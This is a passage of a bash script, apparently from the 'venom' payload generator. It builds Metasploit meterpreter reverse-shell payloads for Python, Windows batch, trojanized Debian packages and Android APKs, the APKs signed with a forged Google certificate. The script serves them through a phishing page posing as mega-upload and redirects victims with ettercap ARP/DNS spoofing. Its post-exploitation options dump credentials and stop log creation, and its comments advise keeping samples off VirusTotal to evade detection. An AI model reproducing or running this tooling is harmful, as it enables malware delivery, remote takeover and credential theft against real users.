sleep 2
# use SED to replace SRVHOST in web_delivery.py
sed "s/SRVHOST/$srvhost/g" web_delivery.py > $filename.py
mv $filename.py $IPATH/output/$filename.py
chmod +x $IPATH/output/$filename.py



# post-exploitation
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" FALSE "linux_hostrecon.rc" FALSE "dump_credentials_linux.rc" --width 305 --height 370) > /dev/null 2>&1


  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


if [ "$P0" = "dump_credentials_linux.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/wifi_dump_linux.rb" ]; then
    echo "[✔] wifi_dump_linux.rb -> found"
    sleep 2
  else
    echo "[x] wifi_dump_linux.rb -> not found"
    sleep 1
    echo "    copy post-module to msfdb .."
    cp $IPATH/aux/msf/wifi_dump_linux.rb $pHanTom/post/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1
    echo "[☠] Reloading msfdb database .."
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi
fi


if [ "$P0" = "linux_hostrecon.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/linux_hostrecon.rb" ]; then
    echo "[✔] linux_hostrecon.rb -> found"
    sleep 2
  else
    echo "[x] linux_hostrecon.rb -> not found"
    sleep 1
    echo "[*] copy post-module to msfdb .."
    cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1
    echo "[☠] Reloading msfdb database .."
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi
fi



cd $IPATH/templates/phishing
cp $InJEc12 mega[bak].html
sed "s|NaM3|$filename.py|g" mega.html > copy.html
mv copy.html $ApAcHe/index.html > /dev/null 2>&1
cd $IPATH/output
cp $filename.py $ApAcHe/$filename.py > /dev/null 2>&1
echo "[☠] loading -> Apache2Server!"
echo "---"
echo "- SEND THE URL GENERATED TO TARGET HOST"


        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$filename.py|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$filename.py $ApAcHe/$filename.py
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $filename-$srvhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$srvhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"

        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $filename-$srvhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/web_delivery[bak].py $IPATH/templates/web_delivery.py > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $ApAcHe/$filename.py > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
# -------------------------------------------------

   else

# -------------------------------------------------
echo "[☠] Building shellcode -> $PuLK format ..."
sleep 2
tagett="2"
filename=$(zenity --title="☠ Enter PAYLOAD name ☠" --text "example: payload" --entry --width 300) > /dev/null 2>&1

# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | URIPATH : /SecPatch
    | SRVHOST : $srvhost
    | FORMAT  : PSH -> WINDOWS
    | PAYLOAD : windows/meterpreter/reverse_tcp
    |_STORED  : $IPATH/output/$filename.bat

!


# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
cp $IPATH/templates/web_delivery.bat $IPATH/templates/web_delivery[bak].bat


   # check if exec.ps1 exists
   if [ -e $IPATH/templates/web_delivery.bat ]; then
      echo "[☠] web_delivery.bat -> found!"
      sleep 2
 
   else

      echo "[☠] web_delivery.bat -> not found!"
      exit
      fi


cd $IPATH/templates/
echo "[☠] building -> $filename.bat"
sleep 2
# use SED to replace SRVHOST in web_delivery.py
sed "s/SRVHOST/$srvhost/g" web_delivery.bat > $filename.bat
mv $filename.bat $IPATH/output/$filename.bat
chmod +x $IPATH/output/$filename.bat


# post-exploitation
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 310) > /dev/null 2>&1


  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


cd $IPATH/templates/phishing
cp $InJEc12 mega[bak].html
sed "s|NaM3|$filename.bat|g" mega.html > copy.html
mv copy.html $ApAcHe/index.html > /dev/null 2>&1
cd $IPATH/output
cp $filename.bat $ApAcHe/$filename.bat > /dev/null 2>&1
echo "[☠] loading -> Apache2Server!"
echo "---"
echo "- SEND THE URL GENERATED TO TARGET HOST"


        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$filename.bat|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$filename.bat $ApAcHe/$filename.bat
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $filename-$srvhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$srvhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $filename-$srvhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/web_delivery[bak].bat $IPATH/templates/web_delivery.bat > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $ApAcHe/$filename.bat > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
fi

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_multi_menu
  clear
fi
}





# ----------------------------------------
# kimi - Malicious Debian Packet Creator
# author: Chaitanya Haritash (SSA-RedTeam)
# ----------------------------------------
sh_shellcode20 () {
# get user input to build the payload
echo "[☠] Enter shellcode settings!"
srvhost=$(zenity --title="☠ Enter SRVHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: Chaitanya" --width 300) > /dev/null 2>&1
VeRp=$(zenity --entry --title "☠ DEBIAN PACKET VERSION ☠" --text "example: 1.0.13" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$srvhost" ]; then srvhost="$IP";fi
if [ -z "$VeRp" ]; then VeRp="1.0.13";fi
if [ -z "$N4m" ]; then N4m="Chaitanya";fi

# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | SRVPORT : 8080
    | SRVHOST : $srvhost
    | FORMAT  : SH,PYTHON -> UNIX(s)
    | PAYLOAD : python/meterpreter/reverse_tcp
    |_AGENT   : $IPATH/output/$N4m.deb

!


# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files .."
sleep 2


   # check if kimi.py exists
   if [ -e $IPATH/templates/kimi_MDPC/kimi.py ]; then
      echo "[☠] MDPC-kimi.py -> found!"
      sleep 2
 
   else

      echo "[☠] MDPC-kimi.py -> not found!"
      exit
   fi


# use MDPC to build trojan agent
echo "[☠] Use MDPC-kimi to build agent .."
sleep 2
cd $IPATH/templates/kimi_MDPC
if [ "$ArCh" = "x64" ]; then
xterm -T "kimi.py (MDPC)" -geometry 110x23 -e "python kimi.py -n $N4m -V $VeRp -l $srvhost -a amd64 && sleep 2" > /dev/null 2>&1
else
xterm -T "kimi.py (MDPC)" -geometry 110x23 -e "python kimi.py -n $N4m -V $VeRp -l $srvhost -a i386 && sleep 2" > /dev/null 2>&1
fi
# move agent to the rigth directory (venom)
echo "[☠] Moving agent to output folder .."
sleep 2
mv *.deb $IPATH/output/$N4m.deb > /dev/null 2>&1
mv handler.rc $IPATH/output/handler.rc > /dev/null 2>&1
cd $IPATH/


# copy agent to apache2 and deliver it to target
echo "[☠] Execute in target: sudo dpkg -i $N4m.deb"
sleep 2


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.deb\n\nchose how to deliver: $N4m.deb" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPATH/output/handler.rc"
      sleep 2

   else


      # edit files nedded
      echo "[☠] copy files to webroot..."
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.deb|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.deb $ApAcHe/$N4m.deb > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.deb|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.deb $ApAcHe/$N4m.deb
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPATH/output/handler.rc" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"



        else


        echo "- ATTACK VECTOR: http://$srvhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPATH/output/handler.rc"

        fi
   fi



sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.deb > /dev/null 2>&1
clear
cd $IPATH/
# limpar /usr/local/bin in target on exit
# rm /usr/local/bin/$N4m > /dev/null 2>&1

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_unix_menu
  clear
fi
}





# -----------------------------
# Android payload 
# ----------------------------- 
sh_shellcode21 () {

# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: SignApk" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="SignApk";fi

echo "[☠] Building shellcode -> DALVIK format ..."
# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : DALVIK -> ANDROID
    |_PAYLOAD : android/meterpreter/reverse_tcp

!

# use metasploit to build shellcode (msf encoded)
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -a dalvik --platform Android -f raw > $IPATH/output/$N4m.apk"
sleep 2


## Sign apk application (certificate)
echo -n "${BlueF}[${GreenF}➽${BlueF}]${white} Do you wish to sign $N4m.apk Appl (y|n)?:${Reset}";read cert
if [ "$cert" = "y" ] || [ "$cert" = "Y" ] || [ "$cert" = "yes" ]; then
   imp=`which keytool`
   if [ "$?" -eq "0" ]; then
      echo "[☠] Signing $N4m.apk using keytool ..";sleep 1
      echo "[☠] keytool install found (dependencie)..";sleep 1
      cd $IPATH/output
      imp=`which zipalign`
      if [ "$?" -eq "0" ]; then
         echo "[☠] zipalign install found (dependencie)..";sleep 1
      else
         echo "${RedF}[x]${white} 'zipalign' packet NOT found (installing)..";sleep 2
         echo "";sudo apt-get install zipalign;echo ""
      fi

      ## Sign (SSL certificate) apk Banner
      # https://resources.infosecinstitute.com/lab-hacking-an-android-device-with-msfvenom/
      echo "---"
      echo "- ${YellowF}Android Apk Certificate Function:${Reset}"
      echo "- After Successfully created the .apk file, we need to sign an certificate to it,"
      echo "- because Android mobile devices are not allowing the installing of apps without"
      echo "- the signed certificate. This function uses (keytool | jarsigner | zipalign) to"
      echo "- sign our apk with an SSL certificate (google). We just need to manually input 3"
      echo "- times a SecretKey (password) when asked further head."
      echo "---"
      keytool -genkey -v -keystore $IPATH/output/my-release-key.Keystore -alias $N4m -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Android, OU=Google, O=Google, L=US, ST=NY, C=US";echo "";sleep 2
      jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $IPATH/output/my-release-key.Keystore $N4m.apk $N4m;sleep 2;echo ""
      zipalign -v 4 $IPATH/output/$N4m.apk $IPATH/output/done.apk;sleep 1;echo ""
      mv done.apk $Nam.apk > /dev/null 2>&1
      cd $IPATH
   else
      echo "${RedF}[x]${white} Abort, ${RedF}keytool${white} packet not found..";sleep 1
      echo "[☠] Please Install 'keytool' packet before continue ..";sleep 3
      sh_android_menu # <--- return to android/ios menu
   fi
fi


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.apk\n\nchose how to deliver: $N4m.apk" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
        fi
      sleep 2

   else

      # edit files nedded
      echo "[☠] Porting ALL files to apache2 webroot...";sleep 1
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.apk|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.apk $ApAcHe/$N4m.apk > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!";sleep 1
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.apk|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.apk $ApAcHe/$N4m.apk
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           cd $IPATH/output
           # delete utf-8/non-ancii caracters from output
           tr -cd '\11\12\15\40-\176' < report.log > final.log
           sed -i "s/\[0m//g" final.log
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
           sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
          fi
        fi
   fi



sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
